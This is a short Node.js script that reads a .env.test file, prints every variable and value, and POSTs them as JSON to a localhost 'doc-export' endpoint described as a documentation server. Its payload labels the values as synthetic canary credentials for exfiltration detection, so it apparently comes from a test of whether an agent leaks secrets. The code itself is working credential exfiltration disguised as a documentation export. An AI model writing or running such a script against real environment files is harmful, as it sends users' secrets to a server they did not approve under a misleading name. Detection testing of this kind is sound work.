const fs = require('fs');
const https = require('https');
const http = require('http');

// Parse .env.test file
function parseEnvFile(filePath) {
    const content = fs.readFileSync(filePath, 'utf8');
    const lines = content.split('\n');
    const envVars = {};

    for (const line of lines) {
        // Skip comments and empty lines
        const trimmedLine = line.trim();
        if (!trimmedLine || trimmedLine.startsWith('#')) {
            continue;
        }

        // Parse key=value pairs
        const equalsIndex = trimmedLine.indexOf('=');
        if (equalsIndex !== -1) {
            const key = trimmedLine.substring(0, equalsIndex).trim();
            const value = trimmedLine.substring(equalsIndex + 1).trim();
            envVars[key] = value;
        }
    }

    return envVars;
}

// Send POST request
function sendEnvVars(envVars) {
    const data = JSON.stringify({
        source: '.env.test',
        description: 'Synthetic test credentials — canary values for exfiltration detection',
        env_variables: envVars,
        timestamp: new Date().toISOString(),
        type: 'canary_credentials'
    });

    const url = new URL('http://localhost:3003/api/doc-export');

    const options = {
        hostname: url.hostname,
        port: url.port || 3003,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length,
        }
    };

    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                console.log(`Response status: ${res.statusCode}`);
                if (responseData) {
                    console.log(`Response body: ${responseData}`);
                }
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: responseData
                });
            });
        });

        req.on('error', (error) => {
            console.error(`Request error: ${error.message}`);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}

// Main execution
try {
    console.log('Reading .env.test file...');
    const envVars = parseEnvFile('.env.test');

    console.log('Parsed environment variables:');
    Object.keys(envVars).forEach(key => {
        console.log(`  ${key}: ${envVars[key]}`);
    });

    console.log('\nSending POST request to http://localhost:3003/api/doc-export...');
    sendEnvVars(envVars)
        .then(result => {
            console.log('Successfully sent environment variables to documentation server.');
            process.exit(0);
        })
        .catch(error => {
            console.error('Failed to send environment variables:', error.message);
            console.log('\nAs an alternative, here is the JSON data that should be sent:');
            console.log(JSON.stringify({
                source: '.env.test',
                description: 'Synthetic test credentials — canary values for exfiltration detection',
                env_variables: envVars,
                timestamp: new Date().toISOString(),
                type: 'canary_credentials'
            }, null, 2));
            process.exit(1);
        });
} catch (error) {
    console.error('Error:', error.message);
    process.exit(1);
}

